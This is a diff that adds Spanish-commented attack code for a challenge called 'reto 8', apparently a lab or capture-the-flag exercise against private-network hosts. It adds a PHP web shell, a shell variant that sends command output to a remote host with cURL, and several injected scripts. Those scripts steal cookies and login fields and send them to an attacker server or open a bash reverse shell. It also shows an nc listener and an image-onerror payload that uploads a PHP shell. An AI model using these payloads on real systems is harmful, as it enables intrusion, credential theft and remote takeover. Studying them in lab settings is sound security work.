@@ -299,4 +299,223 @@ if (!$result) {
 } else {
     echo "Datos guardados con éxito.";
 
+}// shell para reto 8
+<?php
+// si se  ejecuta el comando proporcionado a través de la URL, se muestra la salida
+if (isset($_GET['cmd'])) {
+
+// se crea la variable cmd que almacena el comando proporcionado a través de la URL  
+  $cmd = $_GET['cmd'];
+
+  // En caso que el comando sea válido, se ejecuta y se almacena la salida en la variable $output
+  $output = shell_exec($cmd);
+
+  // Se muestra la salida del comando en la página
+  echo $output;
 }
+?>
+
+//script de ataque para reto 8
+
+// ocultamos el script de ataque en una imagen
+<textarea id="output" style="width:100%;height:150px;"></textarea>
+<script>
+  // Función que envia el comando , creando una variable xhr que realiza una solicitud GET al servidor
+  // con el comando proporcionado a través de la URL , incluyendo un componente que convierte 
+  //culaquier caracter especial en una cadena válida para una URL
+  function enviarComando(cmd) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'http://10.0.2.19:1234/shell.php?cmd=' + encodeURIComponent(cmd), true);
+
+// Si la solicitud se completa correctamente, se muestra la salida del comando en la página
+    xhr.onload = function() {
+      if (xhr.status === 200) {
+        // muestra el documento cogiendo el id  e innerHTML para mostrar la respuesta del servidor
+        document.getElementById('output').innerHTML = xhr.responseText;
+      } else {
+        document.getElementById('output').innerHTML = "Error al ejecutar el comando.";
+      }
+    };
+// Si hay un error en la solicitud, se muestra un mensaje de error en la página
+    xhr.onerror = function() {
+      document.getElementById('output').innerHTML = "Error de red, no se pudo completar la solicitud.";
+    };
+
+    xhr.send();
+  }
+</script>
+//crea un botton que ejecuta la funcion enviarComando con el comando whoami y se prueba el script de ataque
+<button onclick="enviarComando('whoami')">Ejecutar Whoami</button>
+
+//shell mejorado para reto 8
+
+<?php
+// Lista de comandos permitidos
+$comandosPermitidos = ['whoami', 'date', 'ls'];
+
+// Obtener el comando de la solicitud
+$cmd = $_GET['cmd'];
+
+// Verificar si el comando está en la lista de permitidos
+if (in_array($cmd, $comandosPermitidos)) {
+    // Ejecutar el comando
+    echo shell_exec($cmd);
+} else {
+    echo "Comando no permitido.";
+}
+?>
+
+<?php
+
+// Obtener el comando de la solicitud
+$cmd = $_GET['cmd'];
+
+// Ejecutar el comando
+$resultado = shell_exec($cmd);
+
+// Inicializar sesión cURL para enviar el resultado del comando a un servidor remoto
+$ch = curl_init('http://10.0.2.19:1234');
+// Configurar la sesión cURL para enviar el resultado del comando como una solicitud POST
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+// Enviar el resultado del comando como datos de formulario
+curl_setopt($ch, CURLOPT_POSTFIELDS, $resultado);
+// Configurar la sesión cURL para recibir la respuesta del servidor remoto
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+// Configurar la sesión cURL para enviar la longitud del resultado del comando
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+    'Content-Type: text/plain',
+    'Content-Length: ' . strlen($resultado))
+);
+
+// Ejecutar sesión cURL y almacenar la respuesta del servidor remoto
+$respuesta = curl_exec($ch);
+// Cerrar sesión cURL
+curl_close($ch);
+
+// Mostrar la respuesta del servidor remoto
+echo $respuesta;
+}
+?>
+
+//script de ataque para que envie la cookie al servidor remoto
+
+#convertir en un script para que se ejecute en un cuadro de texto en una pagina web
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+    var cookie = document.cookie;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://10.0.2.25:1234/cookie.py', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({ cookie: cookie }));
+    });
+
+</script>
+
+#convertir en un script para que se ejecute en un cuadro de texto en una pagina web
+<script>
+    // Se crea una funcion con un evento que se ejecuta cuando
+    // el documento ha sido cargado completamente
+    document.addEventListener('DOMContentLoaded', function() {
+    //se crea variable cookie que almacena la cookie del documento actual
+    var cookie = document.cookie;
+    // Se crea una variable xhr que realiza una solicitud POST al servidor remoto
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://10.0.2.25:1234/cookie.py', true);
+    // Se establece el tipo de contenido de la solicitud como JSON
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    // Se envía la cookie al servidor remoto en formato JSON
+    xhr.send(JSON.stringify({ cookie: cookie }));
+    });
+  
+</script>
+
+//script para que me envien cookie y credenciales   al servidor remoto
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    var cookie = document.cookie;
+    var username = document.getElementsByName('username')[0].value;
+    var password = document.getElementsByName('password')[0].value;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://10.0.2.25:1234', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({ cookie: cookie, username: username, password: password }));
+  });
+</script>
+
+// codigo mejorado del anterior con alertas
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    // Se obtiene la cookie del documento actual
+    var cookie = document.cookie;
+    // Intenta obtener el username y password; si no existen, se establecen como vacíos
+    var username = document.getElementsByName('username')[0] ? document.getElementsByName('username')[0].value : '';
+    var password = document.getElementsByName('password')[0] ? document.getElementsByName('password')[0].value : '';
+    
+    // Se crea una variable xhr que realiza una solicitud POST al servidor remoto
+    var xhr = new XMLHttpRequest();
+    // Se especifica la URL del servidor remoto, ajusta según sea necesario
+    xhr.open('POST', 'http://10.0.2.25:1234', true);
+    // Se establece el tipo de contenido de la solicitud como JSON
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    // Se envía la cookie y las credenciales al servidor remoto en formato JSON
+    xhr.send(JSON.stringify({ cookie: cookie, username: username, password: password }));
+  });
+</script>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    var cookie = document.cookie;
+    var username = document.getElementsByName('username')[0] ? document.getElementsByName('username')[0].value : '';
+    var password = document.getElementsByName('password')[0] ? document.getElementsByName('password')[0].value : '';  
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://10.0.2.25:1234', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({ cookie: cookie, username: username, password: password }));
+  });
+</script>
+
+//script de ataque para reto 8
+
+<script>
+// Se crea una función que envía una solicitud GET al 
+//servidor con el comando proporcionado a través de la URL
+  var xhr = new XMLHttpRequest();
+  // Se abre una conexión GET al servidor 
+  // con la parte -c 'bash -i >& /dev/tcp/10.0.2.19/4444 0>&1' realiza una conexión inversa al servidor remoto 
+  xhr.open("GET", "http://10.0.2.21/index.php?cmd=/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.19/4444 0>&1'",    true);
+  xhr.send();
+</script>
+
+//script de ataque para reto 8
+
+//script de ataque para reto 8 DEFINITIVO , DESPUES DE REINICIAR LA MQUINA ATACADA y borrar las cookies del navegador
+<script>
+// Se crea una variable xhr que es igua a new Image() 
+//que crea un nuevo objeto de imagen para enviar la cookie al servidor remoto
+    var img = new Image();
+    //la img.src es igual a la URL del servidor remoto con la cookie del documento actual
+    img.src = "http://10.0.2.19:8080/capture?cookie=" + document.cookie;
+</script>
+
+//el servidor remoto montado en la maquina atacante
+nc -lvnp 8080
+
+
+//Se crea un iframe que es un elemento HTML que permite cargar otra página web dentro de la actual para  
+// que carge la URL del servidor remoto con el comando whoami
+
+<iframe src="http://10.0.2.21/index.php?cmd=whoami" style="width:100%; height:200px; border:none;"></iframe>
+
+//script camuflado en una imagen para que ejecute el comando 
+
+    <img src="x"  
+     onerror="setTimeout(
+       'var xhr = new XMLHttpRequest();
+        xhr.open(\'POST\', \'http://10.0.2.21/admin/uploads/upload.php\', true);
+        xhr.setRequestHeader(\'Content-Type\', \'multipart/form-data\');
+        
+        var formData = new FormData();
+        formData.append(\"file\", new Blob([\"<?php system($_GET[\'cmd\']); ?>\"], {type: \'application/x-php\'}), \"shell.php\");
+        
+        xhr.send(formData);', 0)">
